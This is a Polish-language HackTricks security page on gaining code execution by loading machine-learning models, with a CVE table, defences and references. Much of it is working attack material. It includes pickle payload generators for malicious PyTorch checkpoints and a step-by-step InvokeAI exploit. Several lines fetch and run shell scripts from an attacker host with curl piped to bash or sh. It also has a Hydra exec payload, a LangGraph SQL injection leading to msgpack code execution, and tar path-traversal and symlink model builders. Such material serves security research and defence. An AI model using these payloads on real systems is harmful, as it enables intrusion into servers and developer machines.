# RCE modeli

{{#include ../banners/hacktricks-training.md}}

## Ładowanie modeli do RCE

Modele Machine Learning są zwykle udostępniane w różnych formatach, takich jak ONNX, TensorFlow, PyTorch itd. Modele te mogą być ładowane na maszynach deweloperów lub w systemach produkcyjnych w celu ich używania. Zwykle modele nie powinny zawierać złośliwego kodu, ale w niektórych przypadkach model może służyć do wykonywania dowolnego kodu w systemie jako zamierzona funkcja lub z powodu podatności w bibliotece ładującej modele.

W chwili pisania tego tekstu przykładami tego typu podatności są:

| **Framework / Tool**        | **Podatność (CVE, jeśli dostępny)**                                                    | **Wektor RCE**                                                                                                                           | **Referencje**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Niebezpieczna deserializacja w* `torch.load` **(CVE-2025-32434)**                                                              | Złośliwy pickle w checkpoint modelu prowadzi do wykonania kodu (z pominięciem zabezpieczenia `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + pobranie złośliwego modelu powoduje wykonanie kodu; RCE przez deserializację Java w API zarządzania                                        | |
| **NVIDIA Merlin Transformers4Rec** | Niebezpieczna deserializacja checkpointu przez `torch.load` **(CVE-2025-23298)**                                           | Niezaufany checkpoint uruchamia reducer pickle podczas `load_model_trainer_states_from_checkpoint` → wykonanie kodu w workerze ML            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + niebezpieczny hook rozszerzenia MessagePack **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Kontrolowany przez użytkownika klucz `filter` wstrzykuje składnię SQL/JSON-path, `UNION SELECT` tworzy fałszywy wiersz checkpointu, a następnie deserializacja `msgpack` importuje i wywołuje wybrany przez atakującego kod Python | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (niebezpieczny YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Ładowanie modelu z YAML używa `yaml.unsafe_load` (wykonanie kodu) <br> Ładowanie modelu z warstwą **Lambda** uruchamia dowolny kod Python          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (parsowanie TFLite)                                                                                          | Spreparowany model `.tflite` wywołuje przepełnienie całkowitoliczbowe → uszkodzenie sterty (potencjalne RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Ładowanie modelu przez `joblib.load` wykonuje pickle z payloadem atakującego w `__reduce__`                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (niebezpieczne `np.load`) *sporna*                                                                              | Domyślne zachowanie `numpy.load` umożliwiało tablice obiektów z pickle – złośliwy `.npy/.npz` powoduje wykonanie kodu                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (directory traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Ścieżka external-weights modelu ONNX może wyjść poza katalog (odczyt dowolnych plików) <br> Złośliwe archiwum tar modelu ONNX może nadpisać dowolne pliki (prowadząc do RCE) | |
| ONNX Runtime (design risk)  | *(Brak CVE)* custom ops / control flow ONNX                                                                                    | Model z custom operatorem wymaga załadowania natywnego kodu atakującego; złożone grafy modelu mogą nadużywać logiki w celu wykonywania niezamierzonych obliczeń   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Użycie API ładowania modeli przy włączonej opcji `--model-control` umożliwia przechodzenie po ścieżkach względnych w celu zapisywania plików (np. nadpisania `.bashrc` dla RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (wiele przepełnień sterty)                                                                         | Nieprawidłowo utworzony plik modelu GGUF powoduje przepełnienia bufora sterty w parserze, umożliwiając wykonanie dowolnego kodu w systemie ofiary                     | |
| **Keras (older formats)**   | *(Brak nowego CVE)* Legacy Keras H5 model                                                                                         | Złośliwy model HDF5 (`.h5`) z warstwą Lambda nadal wykonuje kod podczas ładowania (Keras safe_mode nie obejmuje starego formatu – „downgrade attack”) | |
| **Others** (general)        | *Wada projektowa* – serializacja Pickle                                                                                         | Wiele narzędzi ML (np. formaty modeli oparte na pickle, Python `pickle.load`) wykona dowolny kod osadzony w plikach modeli, jeśli nie zostaną zastosowane zabezpieczenia | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Niezaufane metadane przekazane do `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Kontrolowane przez atakującego metadane/konfiguracja modelu ustawia `_target_` na dowolny callable (np. `builtins.exec`) → kod zostaje wykonany podczas ładowania, nawet przy użyciu „bezpiecznych” formatów (`.safetensors`, `.nemo`, repozytoryjny `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Ponadto istnieją modele oparte na python pickle, takie jak modele używane przez [PyTorch](https://github.com/pytorch/pytorch/security), które mogą służyć do wykonywania dowolnego kodu w systemie, jeśli nie zostaną załadowane z `weights_only=True`. Dlatego każdy model oparty na pickle może być szczególnie podatny na tego typu ataki, nawet jeśli nie został wymieniony w powyższej tabeli.

### Metadane Hydra → RCE (działa nawet z safetensors)

`hydra.utils.instantiate()` importuje i wywołuje dowolny kropkowany `_target_` znajdujący się w obiekcie konfiguracji/metadanych. Gdy biblioteki przekazują **niezaufane metadane modelu** do `instantiate()`, atakujący może dostarczyć callable i argumenty, które zostaną natychmiast uruchomione podczas ładowania modelu (bez konieczności użycia pickle).<sup>[[12]](#references)[[13]](#references)</sup>

Przykład payloadu (działa w `model_config.yaml` pliku `.nemo`, repozytoryjnym `config.json` lub w `__metadata__` wewnątrz `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Kluczowe punkty:
- Uruchamiane przed inicjalizacją modelu w `restore_from/from_pretrained` NeMo, coderach HuggingFace uni2TS oraz loaderach FlexTok.
- Stringowa block-list Hydra może zostać ominięta za pomocą alternatywnych ścieżek importu, np. `enum.bltns.eval`, lub nazw rozwiązywanych przez aplikację, np. `nemo.core.classes.common.os.system` → `posix`.<sup>[[14]](#references)</sup>
- FlexTok parsuje również stringified metadata za pomocą `ast.literal_eval`, umożliwiając DoS (gwałtowny wzrost zużycia CPU/pamięci) przed wywołaniem Hydra.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` to popularny open-source web interface dla Stable-Diffusion. Wersje **5.3.1 – 5.4.2** udostępniają endpoint REST `/api/v2/models/install`, który pozwala użytkownikom pobierać i ładować modele z dowolnych URL-i.<sup>[[1]](#references)</sup>

Wewnętrznie endpoint ostatecznie wywołuje:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Gdy dostarczony plik jest **checkpointem PyTorch (`*.ckpt`)**, `torch.load` wykonuje **deserializację pickle**. Ponieważ zawartość pochodzi bezpośrednio z kontrolowanego przez użytkownika URL, atakujący może umieścić w checkpoincie złośliwy obiekt z niestandardową metodą `__reduce__`; metoda ta jest wykonywana **podczas deserializacji**, prowadząc do **remote code execution (RCE)** na serwerze InvokeAI.

Podatności nadano identyfikator **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Instrukcja przeprowadzenia exploita

1. Utwórz złośliwy checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Umieść `payload.ckpt` na kontrolowanym przez siebie serwerze HTTP (np. `http://ATTACKER/payload.ckpt`).
3. Wywołaj podatny endpoint (uwierzytelnianie nie jest wymagane):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Gdy InvokeAI pobiera plik, wywołuje `torch.load()` → gadget `os.system` zostaje uruchomiony, a attacker uzyskuje code execution w kontekście procesu InvokeAI.

Gotowy exploit: moduł **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatyzuje cały przebieg.<sup>[[3]](#references)</sup>

#### Warunki

•  InvokeAI 5.3.1-5.4.2 (flaga scan domyślnie ustawiona na **false**)
•  `/api/v2/models/install` dostępne dla attackera
•  Proces ma uprawnienia do wykonywania poleceń shell

#### Mitigations

* Uaktualnij do **InvokeAI ≥ 5.4.3** – patch domyślnie ustawia `scan=True` i wykonuje skanowanie pod kątem malware przed deserializacją.<sup>[[2]](#references)</sup>
* Podczas programowego ładowania checkpointów używaj `torch.load(file, weights_only=True)` lub nowego helpera [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Wymuś allow-listy / signatures dla źródeł modeli i uruchamiaj usługę z zasadą least privilege.

> ⚠️ Pamiętaj, że każdy format oparty na Python pickle (w tym wiele plików `.pt`, `.pkl`, `.ckpt`, `.pth`) jest z natury niebezpieczny podczas deserializacji z niezaufanych źródeł.

---

Przykład doraźnej mitigacji, jeśli musisz nadal uruchamiać starsze wersje InvokeAI za reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE przez niebezpieczne `torch.load` (CVE-2025-23298)

NVIDIA Transformers4Rec (część Merlin) udostępniał niebezpieczny loader checkpointów, który bezpośrednio wywoływał `torch.load()` dla ścieżek podanych przez użytkownika. Ponieważ `torch.load` korzysta z Python `pickle`, kontrolowany przez atakującego checkpoint może wykonywać dowolny kod za pośrednictwem reducera podczas deserializacji.<sup>[[5]](#references)</sup>

Podatna ścieżka (przed poprawką): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Dlaczego prowadzi to do RCE: W Python pickle obiekt może definiować reducer (`__reduce__`/`__setstate__`), który zwraca callable oraz argumenty. Callable jest wykonywany podczas unpicklingu. Jeśli taki obiekt znajduje się w checkpoincie, zostanie uruchomiony przed użyciem jakichkolwiek wag.

Minimalny przykład złośliwego checkpointu:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Wektory dostarczenia i blast radius:
- Zainfekowane checkpointy/modele udostępniane za pośrednictwem repozytoriów, bucketów lub rejestrów artefaktów
- Zautomatyzowane pipeline'y resume/deploy, które automatycznie ładują checkpointy
- Wykonanie odbywa się wewnątrz workerów training/inference, często z podwyższonymi uprawnieniami (np. root w kontenerach)

Naprawa: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) zastąpił bezpośrednie użycie `torch.load()` restrykcyjnym deserializerem z dozwolonej listy, zaimplementowanym w `transformers4rec/utils/serialization.py`. Nowy loader weryfikuje typy/pola i zapobiega wywoływaniu dowolnych callable podczas ładowania.<sup>[[7]](#references)</sup>

Wskazówki defensive dotyczące checkpointów PyTorch:
- Nie wykonuj unpickle niezaufanych danych. W miarę możliwości preferuj nie wykonywalne formaty, takie jak [Safetensors](https://huggingface.co/docs/safetensors/index) lub ONNX.
- Jeśli musisz używać serializacji PyTorch, upewnij się, że `weights_only=True` (obsługiwane w nowszych wersjach PyTorch) lub użyj własnego unpicklera z dozwoloną listą, podobnego do poprawki Transformers4Rec.<sup>[[4]](#references)</sup>
- Wymuszaj weryfikację pochodzenia/sygnatur modeli i sandboxuj deserializację (seccomp/AppArmor; użytkownik non-root; ograniczony FS i brak egressu sieciowego).
- Monitoruj nieoczekiwane procesy potomne uruchamiane przez usługi ML podczas ładowania checkpointu; śledź użycie `torch.load()`/`pickle`.

POC oraz referencje dotyczące wersji podatnej i poprawki:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>
- Loader podatny przed poprawką: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC złośliwego checkpointu: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader po poprawce: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Przykład – tworzenie złośliwego modelu PyTorch

- Utwórz model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Załaduj model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserializacja Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent FaceDetection-DSFD udostępnia endpoint `resnet`, który deserializuje dane kontrolowane przez użytkownika. ZDI potwierdziło, że zdalny attacker może nakłonić ofiarę do załadowania złośliwej strony/pliku, spowodować przesłanie spreparowanego serialized blob do tego endpointu i wywołać deserializację jako `root`, prowadzącą do pełnego przejęcia systemu.

Przebieg exploita odzwierciedla typowe wykorzystanie pickle:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Każdy gadget osiągalny podczas deserializacji (konstruktory, `__setstate__`, callbacki frameworka itp.) może zostać uzbrojony w ten sam sposób, niezależnie od tego, czy transport odbywał się przez HTTP, WebSocket czy plik umieszczony w monitorowanym katalogu.



### LangGraph checkpointer SQLi → MessagePack RCE

Ten łańcuch ataku jest interesujący, ponieważ atakujący **nie musi przesyłać złośliwego pliku modelu**. Zamiast tego aplikacja udostępnia **API trwałości agenta AI** (`get_state_history(..., filter=...)`), a dane wejściowe użytkownika trafiają do buildera zapytań checkpointera.

#### 1. Structural SQLi w filtrach metadanych

Podatny wzorzec SQLite wyglądał następująco:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Wartość jest wiązana później, ale `query_key` jest konkatenowany do **stringu ścieżki JSON**, więc znak `'` wewnątrz klucza słownika wychodzi poza `'$.{query_key}'` i wstrzykuje SQL. Ta sama zasada dotyczy **ścieżek JSON, identyfikatorów, operatorów, `LIMIT` oraz pól TTL**: placeholdery chronią tylko wartości, a nie strukturalną składnię zapytania.

#### 2. `UNION SELECT` może kierować do downstream sinks, a nie tylko służyć do kradzieży danych

Zapytanie zwraca `type` i serializowane bajty `checkpoint`, które są później używane jako:
```python
self.serde.loads_typed((type, checkpoint))
```
Oznacza to, że SQLi w klauzuli `WHERE` może wstrzyknąć **fałszywy wiersz wyniku**:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Jeśli późniejszy kod parsuje, deserializuje, zapisuje lub wykonuje dowolną wybraną kolumnę, przypisz te kolumny do odpowiednich sinków. W tym przypadku fałszywy wiersz zmienia SQLi w **deserializację kontrolowaną przez atakującego**.

#### 3. Niebezpieczne hooki rozszerzeń MessagePack są równoważne gadżetom kodu

Ścieżka `msgpack` w LangGraph używała niestandardowego hooka rozszerzenia, który rozpakowywał zagnieżdżoną krotkę i wykonywał:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Zatem kodowanie obiektu rozszerzenia MessagePack odpowiadającego `("os", "system", "id > /tmp/pwned")` importuje `os`, rozwiązuje `system` i uruchamia polecenie. Podczas przeglądu AI frameworks sprawdzaj **custom MessagePack/JSON/pickle revivers** pod kątem dynamicznych importów, reflection lub arbitralnego dispatchu callable.

#### 4. Praktyczny wzorzec audytu dla agent frameworks

Sprawdź wszystkie dane wejściowe kontrolowane przez użytkownika, które trafiają do:
- API state history / memory / replay / checkpoint listing
- structured filter builders generujących fragmenty zapytań SQL lub Redis
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths, które ufają wierszom zwracanym przez warstwę persistence

Ten konkretny łańcuch dotyczył self-hosted wdrożeń LangGraph korzystających z SQLite lub Redis checkpointers, gdy niezaufani użytkownicy mogli kontrolować `filter`. W ujawnieniu wskazano następujące patched versions: `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` oraz `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

## Modele do Path Traversal

Jak wspomniano w [**tym wpisie na blogu**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), większość formatów modeli używanych przez różne AI frameworks jest oparta na archiwach, zazwyczaj `.zip`. W związku z tym możliwe może być wykorzystanie tych formatów do przeprowadzenia ataków path traversal, umożliwiających odczyt dowolnych plików z systemu, w którym model jest ładowany.<sup>[[16]](#references)</sup>

Na przykład za pomocą poniższego kodu można utworzyć model, który podczas ładowania utworzy plik w katalogu `/tmp`:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Lub za pomocą poniższego kodu możesz utworzyć model, który po załadowaniu utworzy dowiązanie symboliczne do katalogu `/tmp`:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Dogłębna analiza: deserializacja Keras .keras i gadget hunting

Aby zapoznać się z wyspecjalizowanym przewodnikiem po mechanizmach .keras, RCE w warstwie Lambda, problemie arbitrary import w wersjach ≤ 3.8 oraz wykrywaniu gadgetów po poprawce wewnątrz allowlisty, zobacz:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Referencje

- [1] [Blog OffSec – „CVE-2024-12029 – Deserializacja niezaufanych danych w InvokeAI”](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit poprawki InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Dokumentacja modułu Rapid7 Metasploit](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – kwestie bezpieczeństwa dotyczące torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Blog ZDI – „CVE-2025-23298: uzyskiwanie zdalnego wykonania kodu w NVIDIA Merlin”](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Poradnik ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit poprawki Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Podatny loader sprzed poprawki (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC złośliwego checkpointu (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader po poprawce (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – zdalne wykonanie kodu przy użyciu nowoczesnych formatów i bibliotek AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Dokumentacja Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit block-list Hydra (ostrzeżenie dotyczące RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – od SQLi do RCE: wykorzystanie checkpointera LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Przekształcanie błędów Archive Slip w wysokiej wartości bounties AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)

{{#include ../banners/hacktricks-training.md}}
